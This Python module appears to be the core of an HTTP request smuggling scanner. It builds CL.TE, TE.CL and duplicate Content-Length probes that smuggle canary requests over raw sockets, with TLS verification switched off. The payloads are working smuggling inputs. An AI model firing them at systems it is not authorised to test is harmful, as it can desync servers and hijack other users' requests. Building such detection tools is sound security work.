"""Parser discrepancy detection with pipelining-aware canary verification."""

from socket import create_connection, socket, timeout as SocketTimeout
from ssl import CERT_NONE, create_default_context
from typing import Dict, List, Optional, Tuple

from lib.canary import CanaryGenerator


DRAIN_TIMEOUT = 0.6


class ParserDiscrepancyEngine:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> socket:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _drain(self, sock: socket, window: float = DRAIN_TIMEOUT) -> bytes:
        saved = sock.gettimeout()
        sock.settimeout(window)
        data = b""
        try:
            while True:
                try:
                    chunk = sock.recv(65535)
                except SocketTimeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.settimeout(saved)
            except OSError:
                pass
        return data

    def _exchange(self, prefix: bytes, victim: bytes) -> Tuple[bytes, bytes, bool]:
        early = b""
        late = b""
        pipelined = False
        try:
            sock = self._connect()
            sock.sendall(prefix)
            early = self._drain(sock)
            sock.sendall(victim)
            late = self._drain(sock)
            sock.close()
        except OSError:
            pass
        return early, late, pipelined

    def _common_probe(self, prefix: bytes, endpoint: str, host_header: str,
                      canary_path: str, label: str) -> Dict[str, object]:
        victim = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        early, late, _ = self._exchange(prefix, victim)
        early_hit = self.canary.validate(early, canary_path)
        late_hit = self.canary.validate(late, canary_path)
        desync = late_hit and not early_hit
        return {
            "type": label,
            "canary_path": canary_path,
            "early_hit": early_hit,
            "late_hit": late_hit,
            "discrepancy": desync,
            "raw": prefix,
        }

    def probe_cl_te(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        chunk_data = f"0\r\n\r\n{smuggled}"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: {len(chunk_data.encode('latin-1'))}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_data}"
        ).encode("latin-1", errors="replace")
        return self._common_probe(prefix, endpoint, host_header, canary_path, "CL.TE")

    def probe_te_cl(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{len(smuggled):x}\r\n"
            f"{smuggled}"
            f"0\r\n"
            f"\r\n"
        ).encode("latin-1", errors="replace")
        return self._common_probe(prefix, endpoint, host_header, canary_path, "TE.CL")

    def probe_duplicate_cl(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = f"GET {canary_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 5\r\n"
            f"Content-Length: {len(smuggled.encode('latin-1'))}\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1", errors="replace")
        return self._common_probe(prefix, endpoint, host_header, canary_path, "DUPLICATE_CL")

    def run_all(self, endpoint: str, host_header: str) -> List[Dict[str, object]]:
        results = []
        for fn in (self.probe_cl_te, self.probe_te_cl, self.probe_duplicate_cl):
            try:
                results.append(fn(endpoint, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "discrepancy": False})
        return results